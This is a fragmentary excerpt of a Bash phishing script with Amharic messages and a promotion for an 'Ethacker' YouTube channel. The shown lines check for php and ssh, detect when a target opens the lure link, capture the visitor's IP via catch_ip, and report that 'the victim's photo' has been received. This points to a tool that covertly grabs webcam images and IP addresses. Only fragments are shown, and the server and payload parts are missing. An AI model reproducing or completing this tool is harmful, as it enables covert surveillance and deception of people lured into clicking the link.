...
printf " \e[1;77m ቻናላችንን ሰብስክራይብ ያርጉ youtube.com/Ethacker \e[0m \n"
...
command -v php > /dev/null 2>&1 || { echo >&2 "php ያስፈልገዋል ስለዚህ pkg install php ብለው ያውርዱ"; exit 1; }
...
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] ሊንኩን ነክቶታል\n"
catch_ip
rm -rf ip.txt
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m]የተጠቂው ፎቶ ተልኳል\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
...
command -v ssh > /dev/null 2>&1 || { echo >&2 "ssh ያስፈልገዋል እሱን ለመጫን pkg install ssh ብለው ያውርዱ"; exit 1; }
